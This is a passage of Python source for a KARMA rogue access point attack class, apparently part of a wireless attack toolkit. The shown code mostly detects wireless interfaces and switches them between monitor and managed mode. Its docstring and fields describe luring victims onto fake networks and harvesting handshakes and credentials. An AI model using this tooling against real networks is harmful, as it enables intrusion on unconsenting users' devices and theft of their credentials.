#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..tools.tshark import Tshark
from ..gui.utils import SystemUtils

import os
import time
import re
import subprocess
import threading
from collections import defaultdict
import atexit
import signal

class AttackKARMA(Attack):
    """
    KARMA attack implementation.
    
    Exploits client devices by:
    1. Capturing probe requests to extract PNL (Preferred Network List)
    2. Creating rogue APs that respond to any probe request
    3. Automatically connecting victims to fake networks
    
    This is an enhanced Evil Twin attack that targets specific victim preferences
    rather than relying on popular SSID names.
    """
    
    def __init__(self, target=None):
        super(AttackKARMA, self).__init__(target)
        self.pnl_networks = set()  # Captured SSIDs from probe requests
        self.client_probes = defaultdict(list)  # MAC -> list of SSIDs
        self.rogue_ap_process = None
        self.dhcp_process = None
        self.dns_process = None
        
        # Configuration file paths (critical for avoiding AttributeError)
        self.dnsmasq_config = None
        self.hostapd_config = None
        self.hostapd_configs = []
        self.additional_processes = []
        self.dns_spoofing_enabled = False
        self._victim_mgmt_started = False
        
        # Thread management (prevents resource leaks)
        self.active_threads = []
        self.success = False
        self.connected_clients = set()
        self.running = True
        self._cleanup_done = False
        self._attack_started = False  # Flag to prevent duplicate execution
        self._fallback_mode_used = False  # Flag to track if fallback mode was used
        self._networks_scanned = False  # Flag to track if networks have been scanned
        
        # Enhanced KARMA attack components
        self.captured_handshakes = {}  # MAC -> handshake file path
        self.cracked_passwords = {}    # MAC -> cracked password
        self.harvested_credentials = {} # MAC -> credentials dict
        self.real_networks = []        # List of real networks with clients
        self.deauth_active = False     # Deauth attack status
        self.handshake_capture_active = False
        
        # Enhanced handshake capture management
        self.active_capture_threads = {}  # Track active capture threads
        self.handshake_capture_queue = []  # Queue for handshake capture
        self.rogue_ap_networks = []  # Track rogue AP networks
        
        # Thread safety mechanisms
        self._lock = threading.Lock()  # Main lock for shared data
        self._capture_lock = threading.Lock()  # Lock for capture operations
        self._client_lock = threading.Lock()  # Lock for client management
        self._process_lock = threading.Lock()  # Lock for process management
        
        # Resource limits and monitoring
        self.MAX_CONCURRENT_CAPTURES = 2
        self.MAX_HANDSHAKES_PER_CLIENT = 3
        self.MAX_MEMORY_USAGE = 100 * 1024 * 1024  # 100MB
        self._capture_attempts = {}  # Track capture attempts per client
        
        # Timeout mechanisms to prevent infinite loops
        self.MAX_MONITORING_ITERATIONS = 1000  # Max iterations for monitoring loops
        self.MAX_DEAUTH_ITERATIONS = 500  # Max iterations for deauth loops
        self.MAX_CONNECTION_MONITOR_ITERATIONS = 2000  # Max iterations for connection monitoring
        self.LOOP_TIMEOUT_SECONDS = 300  # 5 minutes max per loop
        self._loop_start_times = {}  # Track loop start times
        
        # Process management and cleanup
        self._process_registry = {}  # Track all spawned processes
        self.PROCESS_CLEANUP_TIMEOUT = 10  # Seconds to wait for process cleanup
        
        # Interface conflict resolution
        self._interface_locks = {}  # Track interface usage locks
        self._interface_operations = {}  # Track ongoing interface operations
        self.INTERFACE_OPERATION_TIMEOUT = 30  # Max time for interface operations
        self._interface_conflict_detected = False
        
        # Multi-interface support
        self.available_interfaces = []  # List of available wireless interfaces
        self.probe_interface = None     # Interface for probe capture
        self.rogue_interface = None     # Interface for rogue AP
        self.additional_interfaces = [] # Additional interfaces for multiple APs
        
        # Initialize interface configuration
        self.initialize_interfaces()
        
        # Validate interfaces
        if not self.probe_interface:
            raise ValueError('No probe interface specified for KARMA attack')
        if not self.rogue_interface:
            raise ValueError('No rogue AP interface specified for KARMA attack')
        
        # Check if we have optimal dual-interface setup
        self.check_dual_interface_setup()
    
    def initialize_interfaces(self):
        """Initialize interface configuration for multi-device support"""
        try:
            Color.pl('{+} {C}Initializing multi-interface KARMA attack...{W}')
            
            # Get available wireless interfaces
            self.available_interfaces = self.get_available_interfaces()
            
            if not self.available_interfaces:
                raise ValueError('No wireless interfaces found')
            
            Color.pl('{+} {G}Found {C}%d{W} wireless interfaces: {G}%s{W}' % 
                    (len(self.available_interfaces), ', '.join(self.available_interfaces)))
            
            # Configure interfaces based on availability and user preferences
            self.configure_interfaces()
            
            # Show interface configuration
            self.show_interface_configuration()
            
        except Exception as e:
            Color.pl('{!} {R}Error initializing interfaces: {O}%s{W}' % str(e))
            raise
    
    def check_dual_interface_setup(self):
        """Check if we have optimal dual-interface setup for KARMA attack"""
        try:
            if self.probe_interface == self.rogue_interface:
                Color.pl('{!} {O}WARNING: Using same interface for probe capture and rogue AP{W}')
                Color.pl('{!} {O}This will require mode switching and may cause conflicts{W}')
                Color.pl('{!} {O}For optimal performance, use 2 separate WiFi devices:{W}')
                Color.pl('{!} {O}  - One in monitor mode for probe capture{W}')
                Color.pl('{!} {O}  - One in managed mode for hosting rogue AP{W}')
                Color.pl('{!} {O}Answer: YES - KARMA attack works best with 2 WiFi devices{W}')
            else:
                Color.pl('{+} {G}Optimal dual-interface setup detected{W}')
                Color.pl('{+} {G}Probe interface: %s (monitor mode){W}' % self.probe_interface)
                Color.pl('{+} {G}Rogue interface: %s (managed mode){W}' % self.rogue_interface)
                Color.pl('{+} {G}Answer: YES - KARMA attack optimally uses 2 WiFi devices{W}')
        except Exception as e:
            Color.pl('{!} {O}Error checking dual interface setup: {O}%s{W}' % str(e))
    
    def get_available_interfaces(self):
        """Get list of available wireless interfaces dynamically from system"""
        try:
            interfaces = []
            
            # Method 1: Use iwconfig to find wireless interfaces
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'IEEE 802.11' in line and not line.startswith(' '):
                            # Extract interface name (first word)
                            interface = line.split()[0]
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
            except Exception as e:
                Color.pl('{!} {O}iwconfig method failed: {O}%s{W}' % str(e))
            
            # Method 2: Use ip command to find wireless interfaces
            try:
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ': wl' in line or ': wlan' in line or ': wlp' in line:
                            # Extract interface name
                            interface = line.split(':')[1].strip()
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
            except Exception as e:
                Color.pl('{!} {O}ip command method failed: {O}%s{W}' % str(e))
            
            # Method 3: Check for common interface names (dynamic detection)
            # Get common interface patterns from system
            common_patterns = ['wlan', 'wlp', 'wlx']
            for pattern in common_patterns:
                try:
                    # Use dynamic sysfs path detection
                    sysfs_net_path = '/sys/class/net/'
                    result = subprocess.run(['ls', sysfs_net_path], capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            interface = line.strip()
                            if interface.startswith(pattern) and interface not in interfaces:
                                # Verify it's actually a wireless interface
                                try:
                                    test_result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=1)
                                    if test_result.returncode == 0:
                                        interfaces.append(interface)
                                except:
                                    pass
                except:
                    pass
            
            # Method 3: Use airmon-ng for additional interfaces
            try:
                result = subprocess.run(['airmon-ng'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if '\t' in line and not line.startswith('PHY') and not line.startswith('Interface'):
                            parts = line.split('\t')
                            if len(parts) >= 2:
                                interface = parts[1].strip()
                                if interface and interface not in interfaces:
                                    interfaces.append(interface)
            except Exception as e:
                Color.pl('{!} {O}airmon-ng method failed: {O}%s{W}' % str(e))
            
            # Method 4: Check /sys/class/net for wireless interfaces using dynamic path
            try:
                import os
                # Use dynamic sysfs path detection
                sysfs_net_path = '/sys/class/net'
                if os.path.exists(sysfs_net_path):
                    for interface in os.listdir(sysfs_net_path):
                        if interface.startswith(('wl', 'wlan', 'wlp')):
                            # Check if it's actually wireless
                            wireless_path = os.path.join(sysfs_net_path, interface, 'wireless')
                            if os.path.exists(wireless_path) and interface not in interfaces:
                                interfaces.append(interface)
            except Exception as e:
                Color.pl('{!} {O}/sys/class/net method failed: {O}%s{W}' % str(e))
            
            # Method 5: Detect base interfaces from monitor interfaces (airmon-ng scenarios)
            try:
                # If we found monitor interfaces, try to detect their base interfaces
                monitor_interfaces = [iface for iface in interfaces if iface.endswith('mon')]
                for monitor_iface in monitor_interfaces:
                    # Extract base interface name (remove 'mon' suffix)
                    base_iface = monitor_iface[:-3] if monitor_iface.endswith('mon') else monitor_iface
                    
                    # Check if base interface exists in sysfs
                    base_path = os.path.join('/sys/class/net', base_iface)
                    if os.path.exists(base_path) and base_iface not in interfaces:
                        # Verify it's a wireless interface
                        wireless_path = os.path.join(base_path, 'wireless')
                        if os.path.exists(wireless_path):
                            interfaces.append(base_iface)
                            Color.pl('{+} {C}Detected base interface {G}%s{W} from monitor interface {G}%s{W}' % (base_iface, monitor_iface))
            except Exception as e:
                Color.pl('{!} {O}Base interface detection failed: {O}%s{W}' % str(e))
            
            Color.pl('{+} {G}Found {C}%d{W} wireless interfaces: {G}%s{W}' % (len(interfaces), ', '.join(interfaces)))
            return interfaces
            
        except Exception as e:
            Color.pl('{!} {R}Error getting interfaces: {O}%s{W}' % str(e))
            return []
    
    def get_interface_state(self, interface):
        """Get detailed state information for an interface"""
        try:
            state = {
                'name': interface,
                'mode': 'unknown',
                'status': 'unknown',
                'frequency': None,
                'essid': None,
                'mac': None,
                'power': None,
                'available': False
            }
            
            # Check if interface exists and is available
            try:
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    state['available'] = True
                    output = result.stdout
                    
                    # Extract mode
                    if 'Mode:Monitor' in output:
                        state['mode'] = 'monitor'
                    elif 'Mode:Managed' in output:
                        state['mode'] = 'managed'
                    elif 'Mode:Master' in output:
                        state['mode'] = 'master'
                    else:
                        state['mode'] = 'unknown'
                    
                    # Extract ESSID
                    if 'ESSID:' in output:
                        essid_part = output.split('ESSID:')[1].split()[0]
                        if essid_part != 'off/any':
                            state['essid'] = essid_part.strip('"')
                    
                    # Extract frequency
                    if 'Frequency:' in output:
                        freq_part = output.split('Frequency:')[1].split()[0]
                        state['frequency'] = freq_part
                    
                    # Extract MAC address
                    if 'Access Point:' in output:
                        mac_part = output.split('Access Point:')[1].split()[0]
                        if mac_part != 'Not-Associated':
                            state['mac'] = mac_part
                    
                    # Extract power level
                    if 'Power:' in output:
                        power_part = output.split('Power:')[1].split()[0]
                        state['power'] = power_part
                    
                    # Determine status
                    if 'IEEE 802.11' in output:
                        state['status'] = 'active'
                    else:
                        state['status'] = 'inactive'
                        
                else:
                    state['available'] = False
                    
            except Exception as e:
                state['available'] = False
                Color.pl('{!} {O}Error checking interface %s: {O}%s{W}' % (interface, str(e)))
            
            return state
            
        except Exception as e:
            Color.pl('{!} {R}Error getting interface state: {O}%s{W}' % str(e))
            return {'name': interface, 'available': False, 'mode': 'unknown', 'status': 'unknown'}
    
    def find_best_interfaces_dynamically(self):
        """Dynamically find the best interfaces for probe capture and rogue AP"""
        try:
            Color.pl('{+} {C}Scanning system for optimal interfaces...{W}')
            
            # Use already available interfaces instead of scanning again
            all_interfaces = self.available_interfaces
            if not all_interfaces:
                Color.pl('{!} {R}No wireless interfaces found!{W}')
                return None, None
            
            # Get detailed state for each interface
            interface_states = []
            for interface in all_interfaces:
                state = self.get_interface_state(interface)
                interface_states.append(state)
                
                # Show interface details
                mode_color = '{G}' if state['mode'] == 'monitor' else '{O}' if state['mode'] == 'managed' else '{R}'
                Color.pl('{+} {C}Interface {G}%s{W}: {C}Mode={O}%s{W}, {C}Status={O}%s{W}, {C}Available={O}%s{W}' % 
                        (interface, state['mode'], state['status'], 'Yes' if state['available'] else 'No'))
            
            # Find interfaces by preference
            monitor_interfaces = [s for s in interface_states if s['mode'] == 'monitor' and s['available']]
            managed_interfaces = [s for s in interface_states if s['mode'] == 'managed' and s['available']]
            other_interfaces = [s for s in interface_states if s['available'] and s not in monitor_interfaces and s not in managed_interfaces]
            
            # Select probe interface (prefer monitor mode)
            probe_interface = None
            if monitor_interfaces:
                probe_interface = monitor_interfaces[0]['name']
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (monitor mode - optimal){W}' % probe_interface)
            elif managed_interfaces:
                probe_interface = managed_interfaces[0]['name']
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (managed mode - will switch to monitor){W}' % probe_interface)
            elif other_interfaces:
                probe_interface = other_interfaces[0]['name']
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (will configure for monitor mode){W}' % probe_interface)
            
            # Select rogue interface (prefer managed mode, different from probe)
            rogue_interface = None
            
            # First priority: Find a different interface from probe in managed mode
            for managed in managed_interfaces:
                if managed['name'] != probe_interface:
                    rogue_interface = managed['name']
                    Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (managed mode - optimal, different from probe){W}' % rogue_interface)
                    break
            
            # Second priority: Find any different interface from probe
            if not rogue_interface:
                for other in other_interfaces:
                    if other['name'] != probe_interface:
                        rogue_interface = other['name']
                        Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (will configure for managed mode, different from probe){W}' % rogue_interface)
                        break
            
            # Last resort: Use same interface as probe (will require mode switching)
            if not rogue_interface:
                # Use same interface as probe (not optimal)
                rogue_interface = probe_interface
                Color.pl('{!} {O}Using same interface for both probe and rogue (not optimal){W}')
            
            return probe_interface, rogue_interface
            
        except Exception as e:
            Color.pl('{!} {R}Error finding interfaces dynamically: {O}%s{W}' % str(e))
            return None, None
    
    def configure_interfaces(self):
        """Configure interfaces for KARMA attack using dynamic detection"""
        try:
            # Check for user-specified interfaces first
            user_probe = getattr(Configuration, 'karma_probe_interface', None)
            user_rogue = getattr(Configuration, 'karma_rogue_interface', None)
            
            if user_probe and user_rogue:
                # Both interfaces specified by user - check if they're different
                if user_probe == user_rogue:
                    Color.pl('{!} {O}WARNING: User specified same interface for both probe and rogue{W}')
                    Color.pl('{!} {O}This will require mode switching and may cause conflicts{W}')
                    Color.pl('{+} {C}Attempting to find alternative interface for rogue AP...{W}')
                    
                    # Try to find a different interface for rogue AP
                    available_interfaces = self.available_interfaces
                    alternative_rogue = None
                    
                    for iface in available_interfaces:
                        if iface != user_probe:
                            alternative_rogue = iface
                            break
                    
                    if alternative_rogue:
                        Color.pl('{+} {G}Found alternative interface: {C}%s{W} for rogue AP{W}' % alternative_rogue)
                        self.probe_interface = user_probe
                        self.rogue_interface = alternative_rogue
                    else:
                        Color.pl('{!} {O}No alternative interface found, using same interface for both{W}')
                        self.probe_interface = user_probe
                        self.rogue_interface = user_rogue
                else:
                    # Different interfaces specified - optimal setup
                    self.probe_interface = user_probe
                    self.rogue_interface = user_rogue
                    Color.pl('{+} {G}Using user-specified interfaces (optimal dual-interface setup):{W}')
                
                Color.pl('{+} {G}  Probe interface: {C}%s{W}' % self.probe_interface)
                Color.pl('{+} {G}  Rogue interface: {C}%s{W}' % self.rogue_interface)
            else:
                # Use dynamic detection
                Color.pl('{+} {C}Using dynamic interface detection...{W}')
                probe_interface, rogue_interface = self.find_best_interfaces_dynamically()
                
                if not probe_interface or not rogue_interface:
                    Color.pl('{!} {R}Failed to find suitable interfaces!{W}')
                    raise ValueError('No suitable interfaces found')
                
                self.probe_interface = probe_interface
                self.rogue_interface = rogue_interface
            
            # Validate the selected interfaces
            self.validate_selected_interfaces()
            
            # Get additional interfaces for multiple APs
            self.additional_interfaces = self.get_additional_interfaces_for_aps()
            
        except Exception as e:
            Color.pl('{!} {R}Error configuring interfaces: {O}%s{W}' % str(e))
            raise
    
    def validate_selected_interfaces(self):
        """Validate that the selected interfaces are available and working"""
        try:
            Color.pl('{+} {C}Validating selected interfaces...{W}')
            
            # Check probe interface
            probe_state = self.get_interface_state(self.probe_interface)
            if not probe_state['available']:
                Color.pl('{!} {R}Probe interface %s is not available!{W}' % self.probe_interface)
                raise ValueError('Probe interface not available')
            else:
                Color.pl('{+} {G}Probe interface {C}%s{W} validated: {O}%s{W} mode, {O}%s{W} status' % 
                        (self.probe_interface, probe_state['mode'], probe_state['status']))
            
            # Check rogue interface
            rogue_state = self.get_interface_state(self.rogue_interface)
            if not rogue_state['available']:
                Color.pl('{!} {R}Rogue interface %s is not available!{W}' % self.rogue_interface)
                raise ValueError('Rogue interface not available')
            else:
                Color.pl('{+} {G}Rogue interface {C}%s{W} validated: {O}%s{W} mode, {O}%s{W} status' % 
                        (self.rogue_interface, rogue_state['mode'], rogue_state['status']))
            
            # Warn if using same interface for both
            if self.probe_interface == self.rogue_interface:
                Color.pl('{!} {O}WARNING: Using same interface for probe and rogue AP{W}')
                Color.pl('{!} {O}This will require mode switching and may cause conflicts{W}')
                Color.pl('{!} {O}For optimal performance, use 2 separate WiFi devices{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error validating interfaces: {O}%s{W}' % str(e))
            raise
    
    def select_best_probe_interface(self):
        """Select the best interface for probe capture"""
        try:
            # Prefer interfaces in monitor mode
            monitor_interfaces = []
            managed_interfaces = []
            
            for interface in self.available_interfaces:
                try:
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                    if 'Mode:Monitor' in result.stdout:
                        monitor_interfaces.append(interface)
                    elif 'Mode:Managed' in result.stdout:
                        managed_interfaces.append(interface)
                except:
                    managed_interfaces.append(interface)  # Assume managed if can't determine
            
            # Prefer monitor mode interfaces for probe capture
            if monitor_interfaces:
                selected = monitor_interfaces[0]
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (monitor mode)' % selected)
                return selected
            elif managed_interfaces:
                selected = managed_interfaces[0]
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (managed mode)' % selected)
                return selected
            else:
                # Fallback to first available interface
                selected = self.available_interfaces[0]
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (fallback)' % selected)
                return selected
                
        except Exception as e:
            Color.pl('{!} {R}Error selecting probe interface: {O}%s{W}' % str(e))
            return self.available_interfaces[0] if self.available_interfaces else None
    
    def select_best_rogue_interface(self):
        """Select the best interface for rogue AP"""
        try:
            # Prefer interfaces in managed mode for AP functionality
            managed_interfaces = []
            monitor_interfaces = []
            
            for interface in self.available_interfaces:
                try:
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                    if 'Mode:Managed' in result.stdout:
                        managed_interfaces.append(interface)
                    elif 'Mode:Monitor' in result.stdout:
                        monitor_interfaces.append(interface)
                except:
                    managed_interfaces.append(interface)  # Assume managed if can't determine
            
            # Prefer managed mode interfaces for AP functionality
            if managed_interfaces:
                selected = managed_interfaces[0]
                Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (managed mode)' % selected)
                return selected
            elif monitor_interfaces:
                selected = monitor_interfaces[0]
                Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (monitor mode - will switch to managed)' % selected)
                return selected
            else:
                # Fallback to first available interface
                selected = self.available_interfaces[0]
                Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (fallback)' % selected)
                return selected
                
        except Exception as e:
            Color.pl('{!} {R}Error selecting rogue interface: {O}%s{W}' % str(e))
            return self.available_interfaces[0] if self.available_interfaces else None
    
    def select_different_interfaces(self):
        """Ensure probe and rogue interfaces are different"""
        try:
            if len(self.available_interfaces) < 2:
                Color.pl('{!} {O}Only one interface available - will use mode switching{W}')
                Color.pl('{!} {O}This may cause delays and conflicts between phases{W}')
                Color.pl('{!} {O}Recommendation: Use 2 separate WiFi devices for optimal performance{W}')
                return
            
            # Find interfaces different from current probe interface
            other_interfaces = [iface for iface in self.available_interfaces if iface != self.probe_interface]
            
            if other_interfaces:
                # Prefer interfaces that are already in managed mode
                managed_interfaces = []
                monitor_interfaces = []
                
                for iface in other_interfaces:
                    try:
                        result = subprocess.run(['iwconfig', iface], capture_output=True, text=True, timeout=3)
                        if 'Mode:Managed' in result.stdout:
                            managed_interfaces.append(iface)
                        elif 'Mode:Monitor' in result.stdout:
                            monitor_interfaces.append(iface)
                    except:
                        managed_interfaces.append(iface)  # Assume managed if can't determine
                
                # Prefer managed interfaces for rogue AP
                if managed_interfaces:
                    self.rogue_interface = managed_interfaces[0]
                    Color.pl('{+} {G}Switched rogue interface to: {C}%s{W} (already in managed mode)' % self.rogue_interface)
                elif monitor_interfaces:
                    self.rogue_interface = monitor_interfaces[0]
                    Color.pl('{+} {G}Switched rogue interface to: {C}%s{W} (will switch from monitor to managed)' % self.rogue_interface)
                else:
                    self.rogue_interface = other_interfaces[0]
                    Color.pl('{+} {G}Switched rogue interface to: {C}%s{W}' % self.rogue_interface)
            else:
                Color.pl('{!} {O}No alternative interfaces available{W}')
                
        except Exception as e:
            Color.pl('{!} {R}Error selecting different interfaces: {O}%s{W}' % str(e))
    
    def cleanup_interface_name(self, interface):
        """Clean up corrupted interface names like wlan0monmon"""
        try:
            if not interface:
                return interface
                
            # Handle multiple monitor suffixes properly
            cleaned = interface
            
            # Remove all 'mon' suffixes until we get to the base interface
            while cleaned.endswith('mon') or cleaned.endswith('mon0') or cleaned.endswith('mon1'):
                if cleaned.endswith('mon0'):
                    cleaned = cleaned[:-4]  # Remove 'mon0'
                elif cleaned.endswith('mon1'):
                    cleaned = cleaned[:-4]  # Remove 'mon1'
                elif cleaned.endswith('mon'):
                    cleaned = cleaned[:-3]  # Remove 'mon'
                else:
                    break
            
            # Check if the cleaned interface exists, if not, try the original
            try:
                result = subprocess.run(['iwconfig', cleaned], capture_output=True, text=True, timeout=2)
                if result.returncode != 0:
                    # If cleaned interface doesn't exist, try the original
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        cleaned = interface  # Use original if it exists
            except:
                pass
            
            if cleaned != interface:
                Color.pl('{+} {C}Cleaned interface name: {O}%s{W} -> {G}%s{W}' % (interface, cleaned))
            
            return cleaned
            
        except Exception as e:
            Color.pl('{!} {R}Error cleaning interface name: {O}%s{W}' % str(e))
            return interface
    
    def resolve_interface_name(self, interface):
        """Resolve interface name to an actual existing interface"""
        try:
            # If interface ends with 'mon', try to find the base interface first
            if interface.endswith('mon'):
                base_name = interface[:-3]  # Remove 'mon' suffix
                # Check if base interface exists
                result = subprocess.run(['iwconfig', base_name], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    Color.pl('{+} {C}Resolved monitor interface: {O}%s{W} -> {G}%s{W}' % (interface, base_name))
                    return base_name
            
            # First, try the interface as-is
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                return interface
            
            # If that fails, try to find a similar interface
            available_interfaces = self.get_available_interfaces()
            if not available_interfaces:
                return interface
            
            # Try to find base interface (remove 'mon' suffix)
            base_name = interface.replace('mon', '').replace('mon0', '').replace('mon1', '')
            for iface in available_interfaces:
                if iface == base_name or iface.replace('mon', '') == base_name:
                    Color.pl('{+} {C}Resolved interface: {O}%s{W} -> {G}%s{W}' % (interface, iface))
                    return iface
            
            # Fallback to first available interface
            Color.pl('{+} {C}Using fallback interface: {O}%s{W} -> {G}%s{W}' % (interface, available_interfaces[0]))
            return available_interfaces[0]
            
        except Exception as e:
            Color.pl('{!} {R}Error resolving interface name: {O}%s{W}' % str(e))
            return interface
    
    def find_monitor_interface_dynamically(self, base_interface):
        """Dynamically find the monitor mode interface name"""
        try:
            # Get all current interfaces
            current_interfaces = self.get_available_interfaces()
            
            # Use system detection to find actual interfaces - no hardcoded names
            possible_names = SystemUtils.get_wireless_interfaces()
            
            # Also check for any new interfaces that appeared
            for interface in current_interfaces:
                if interface not in possible_names:
                    possible_names.append(interface)
            
            # Check each possible name
            for name in possible_names:
                try:
                    result = subprocess.run(['iwconfig', name], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                        return name
                except:
                    continue
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error finding monitor interface: {O}%s{W}' % str(e))
            return None
    
    def switch_to_managed_mode(self, interface):
        """Switch interface to managed mode using iwconfig (like GUI)"""
        try:
            Color.pl('{+} {C}Switching {G}%s{W} to managed mode...{W}' % interface)
            
            # Step 0: Resolve interface name to an actual existing interface
            Color.pl('{+} {C}Resolving interface name...{W}')
            original_interface = interface
            interface = self.resolve_interface_name(interface)
            if interface != original_interface:
                Color.pl('{+} {C}Interface resolved: {O}%s{W} -> {G}%s{W}' % (original_interface, interface))
            
            # Step 1: Clean up any monitor mode processes
            Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
            
            # Check if NetworkManager is running
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{+} {C}NetworkManager is running - no conflict{W}')
                else:
                    Color.pl('{+} {C}NetworkManager is not running - no conflict{W}')
            except:
                Color.pl('{+} {C}NetworkManager status unknown - continuing{W}')
            
            # Step 2: Stop airmon-ng processes (but don't rely on it)
            Color.pl('{+} {C}Stopping airmon-ng processes{W}')
            try:
                result = subprocess.run(['airmon-ng', 'stop', interface], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    Color.pl('{+} {G}airmon-ng stop successful{W}')
                else:
                    # This is expected when not running as root - we'll handle it with iwconfig
                    Color.pl('{!} {O}airmon-ng stop failed (continuing with alternative method){W}')
            except Exception as e:
                # This is expected when not running as root - we'll handle it with iwconfig
                Color.pl('{!} {O}airmon-ng stop failed (continuing with alternative method){W}')
            
            # Step 4: Use iwconfig to switch to managed mode (like GUI)
            Color.pl('{+} {C}Switching to managed mode{W}')
            try:
                # First, bring interface down
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=3)
                
                # Set managed mode using iwconfig
                result = subprocess.run(['iwconfig', interface, 'mode', 'managed'], capture_output=True, text=True, timeout=3)
                if result.returncode != 0:
                    Color.pl('{!} {R}Failed to set managed mode: {O}%s{W}' % result.stderr.strip())
                    return False, interface
                
                # Bring interface back up
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
                
                Color.pl('{+} {G}Successfully switched to managed mode{W}')
                
            except Exception as e:
                Color.pl('{!} {R}Failed to switch to managed mode: {O}%s{W}' % str(e))
                return False, interface
            
            # Step 4: Verify interface mode
            Color.pl('{+} {C}Verifying interface mode for {G}%s{W}...{W}' % interface)
            try:
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    output = result.stdout
                    Color.pl('{+} {C}Debug: iwconfig output: {O}%s{W}' % output.strip())
                    
                    if 'Mode:Managed' in output:
                        Color.pl('{+} {G}✓ Interface {G}%s{W} is in managed mode{W}' % interface)
                        return True, interface
                    else:
                        Color.pl('{!} {R}Interface is not in managed mode{W}')
                        return False, interface
                else:
                    Color.pl('{!} {R}Failed to verify interface mode{W}')
                    return False, interface
                    
            except Exception as e:
                Color.pl('{!} {R}Failed to verify interface mode: {O}%s{W}' % str(e))
                return False, interface
                
        except Exception as e:
            Color.pl('{!} {R}Error switching to managed mode: {O}%s{W}' % str(e))
            return False, interface
    
    def switch_to_monitor_mode(self, interface):
        """Switch interface to monitor mode using iwconfig (like GUI)"""
        try:
            Color.pl('{+} {C}Switching {G}%s{W} to monitor mode...{W}' % interface)
            
            # Step 0: Resolve interface name to an actual existing interface
            Color.pl('{+} {C}Resolving interface name...{W}')
            original_interface = interface
            interface = self.resolve_interface_name(interface)
            if interface != original_interface:
                Color.pl('{+} {C}Interface resolved: {O}%s{W} -> {G}%s{W}' % (original_interface, interface))
            
            # Step 1: Clean up any managed mode processes
            Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
            
            # Check if NetworkManager is running
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{+} {C}NetworkManager is running - no conflict{W}')
                else:
                    Color.pl('{+} {C}NetworkManager is not running - no conflict{W}')
            except:
                Color.pl('{+} {C}NetworkManager status unknown - continuing{W}')
            
            # Step 2: Use airmon-ng to start monitor mode (more reliable for monitor mode)
            Color.pl('{+} {C}Starting monitor mode{W}')
            try:
                result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    Color.pl('{+} {G}airmon-ng start successful{W}')
                    
                    # Find the monitor interface name
                    monitor_iface = self.find_monitor_interface_dynamically(interface)
                    if monitor_iface:
                        Color.pl('{+} {G}Found monitor interface: {G}%s{W}' % monitor_iface)
                        return True, monitor_iface
                    else:
                        # Check if original interface is now in monitor mode
                        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                        if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                            Color.pl('{+} {G}Interface is in monitor mode{W}')
                            return True, interface
                        else:
                            Color.pl('{!} {R}Could not verify monitor mode{W}')
                            return False, interface
                else:
                    Color.pl('{!} {O}airmon-ng start failed: {O}%s{W}' % result.stderr.strip())
                    return False, interface
                    
            except Exception as e:
                Color.pl('{!} {R}Failed to start monitor mode: {O}%s{W}' % str(e))
                return False, interface
                
        except Exception as e:
            Color.pl('{!} {R}Error switching to monitor mode: {O}%s{W}' % str(e))
            return False, interface
    
    def fallback_monitor_mode(self, interface):
        """Fallback method to enable monitor mode"""
        try:
            # First check if interface exists
            test_result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if test_result.returncode != 0:
                Color.pl('{!} {R}Interface {G}%s{W} is not available{W}' % interface)
                
                # Try to find the correct interface
                Color.pl('{+} {C}Searching for correct interface...{W}')
                available_interfaces = self.get_available_interfaces()
                if available_interfaces:
                    interface = available_interfaces[0]
                    Color.pl('{+} {G}Using available interface: {G}%s{W}' % interface)
                else:
                    Color.pl('{!} {R}No interfaces found{W}')
                    return False, interface
            
            # Try using iwconfig directly
